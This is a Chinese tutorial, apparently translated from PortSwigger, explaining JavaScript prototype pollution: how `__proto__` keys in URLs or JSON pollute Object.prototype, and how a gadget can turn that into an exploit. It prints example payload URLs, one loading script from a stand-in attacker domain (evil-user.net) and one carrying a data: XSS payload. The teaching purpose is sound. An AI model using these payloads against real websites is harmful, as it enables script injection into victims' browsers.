# 什么是原型污染？

原型污染是一种 JavaScript 漏洞，它允许攻击者向全局对象的原型中添加任意属性，这些属性随后可能被用户定义的对象所继承。

![通过原型污染污染配置对象](https://portswigger.net/web-security/prototype-pollution/images/prototype-pollution-infographic.svg)

虽然原型污染作为独立漏洞往往难以直接利用，但它让攻击者能够控制原本不可访问的对象属性。如果应用程序随后以不安全的方式处理了攻击者可控的属性，这可能与其他漏洞串联利用。在客户端 JavaScript 中，这通常会导致 [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)，而服务端原型污染甚至可能导致远程代码执行。

如果你不熟悉 JavaScript 中原型和继承的工作原理，建议在继续之前阅读以下概述。

[JavaScript 原型与继承](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

## 原型污染漏洞是如何产生的？

原型污染漏洞通常出现在以下情况：JavaScript 函数将一个包含用户可控属性的对象递归合并到现有对象中，但未先对键进行过滤。这使得攻击者能够注入一个键名为 `__proto__` 的属性，以及任意嵌套属性。

由于在 JavaScript 上下文中 [`__proto__` 的特殊含义](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto)，合并操作可能会将嵌套属性赋值给对象的[原型](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript)，而非目标对象本身。因此，攻击者可以污染原型，向其中注入含有恶意值的属性，这些属性随后可能被应用程序以危险的方式使用。

任何原型对象都可能被污染，但最常见的是[内置全局对象 `Object.prototype`](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain)。

成功利用原型污染需要以下关键组件：

- [原型污染源](#prototype-pollution-sources)——任何能够让你用任意属性污染原型对象的输入。
- [汇点](#prototype-pollution-sinks)——即能够执行任意代码的 JavaScript 函数或 DOM 元素。
- [可利用的小工具](#prototype-pollution-gadgets)——任何未经过滤或清理便被传递到汇点的属性。

## 原型污染源

原型污染源是指任何用户可控的、能够让你向原型对象添加任意属性的输入。最常见的来源如下：

- 通过查询字符串或片段字符串（哈希）的 [URL](#prototype-pollution-via-the-url)
- [基于 JSON 的输入](#prototype-pollution-via-json-input)、JWT、表单参数、反序列化
- Web 消息

### 通过 URL 进行原型污染

考虑以下 URL，其中包含攻击者构造的查询字符串：

`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

当将查询字符串分解为 `key:value` 对时，URL 解析器可能将 `__proto__` 解释为任意字符串。但让我们看看，如果这些键和值随后作为属性被合并到现有对象中，会发生什么。

你可能认为 `__proto__` 属性及其嵌套的 `evilProperty` 只会被添加到目标对象中，如下所示：

```javascript
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

然而，实际情况并非如此。在某个时刻，递归合并操作可能会使用等同于以下语句的方式赋值 `evilProperty` 的值：

```javascript
targetObject.__proto__.evilProperty = 'payload';
```

在赋值过程中，JavaScript 引擎将 `__proto__` 视为原型的 getter。因此，`evilProperty` 被赋值给返回的原型对象，而非目标对象本身。假设目标对象使用默认的 `Object.prototype`，则 JavaScript 运行时中的所有对象现在都将继承 `evilProperty`，除非它们自身已经拥有同名的属性。

实际上，注入名为 `evilProperty` 的属性不太可能产生任何效果。然而，攻击者可以使用相同的技术，用应用程序或任何导入库所使用的属性来污染原型。

### 通过 JSON 输入进行原型污染

用户可控的对象通常使用 `JSON.parse()` 方法从 JSON 字符串派生而来。有趣的是，`JSON.parse()` 也将 JSON 对象中的任何键视为任意字符串，包括像 `__proto__` 这样的键。这为原型污染提供了另一个潜在向量。

假设攻击者注入以下恶意 JSON，例如通过 Web 消息：

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

如果通过 `JSON.parse()` 方法将其转换为 JavaScript 对象，结果对象实际上会有一个键名为 `__proto__` 的属性：

```javascript
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

如果通过 `JSON.parse()` 创建的对象随后在未经过适当键清理的情况下被合并到现有对象中，这也会在赋值过程中导致原型污染，正如我们在前面的[基于 URL 的示例](#prototype-pollution-via-the-url)中所见。

## 原型污染汇点

原型污染汇点本质上是一个你可以通过原型污染访问的 JavaScript 函数或 DOM 元素，它使你能够执行任意 JavaScript 或系统命令。我们在 [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) 主题中已经广泛介绍了一些客户端汇点。

由于原型污染使你能够控制原本不可访问的属性，这有可能让你接触到目标应用程序中的许多额外汇点。不熟悉原型污染的开发者可能会错误地认为这些属性不可用户控制，因此可能只有极少甚至没有过滤或清理措施。

## 原型污染小工具

小工具提供了一种将原型污染漏洞转化为实际漏洞利用的方法。任何满足以下条件的属性都是小工具：

- 被应用程序以不安全的方式使用，例如未经适当过滤或清理便被传递到汇点。
- 可通过原型污染被攻击者控制。换句话说，该对象必须能够继承攻击者添加到原型中的恶意属性版本。

如果属性直接在对象自身定义，则不能作为小工具。在这种情况下，对象自身的属性版本会优先于你添加到原型中的任何恶意版本。健壮的网站还可能显式将对象的原型设置为 `null`，从而确保它根本不继承任何属性。

### 原型污染小工具示例

许多 JavaScript 库接受一个对象，开发者可以使用该对象设置不同的配置选项。库代码会检查开发者是否向该对象显式添加了某些属性，如果添加了，则相应地调整配置。如果表示特定选项的属性不存在，则通常使用预定义的默认选项。简化的示例如下：

```javascript
let transport_url = config.transport_url || defaults.transport_url;
```

现在假设库代码使用这个 `transport_url` 向页面添加一个脚本引用：

```javascript
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

如果网站的开发者没有在其 `config` 对象上设置 `transport_url` 属性，这就是一个潜在的小工具。当攻击者能够使用自己的 `transport_url` 属性污染全局 `Object.prototype` 时，`config` 对象将继承该属性，从而将此脚本的 `src` 设置为攻击者选择的域。

例如，如果原型可以通过查询参数被污染，攻击者只需诱使受害者访问一个特制 URL，即可让受害者的浏览器从攻击者控制的域导入恶意 JavaScript 文件：

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

通过提供 `data:` URL，攻击者还可以直接在查询字符串中嵌入 XSS 负载，如下所示：

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

注意，此示例末尾的 `//` 仅用于注释掉硬编码的 `/example.js` 后缀。而普通的 `data:javascript,代码` 在此简写为 `data:,代码`
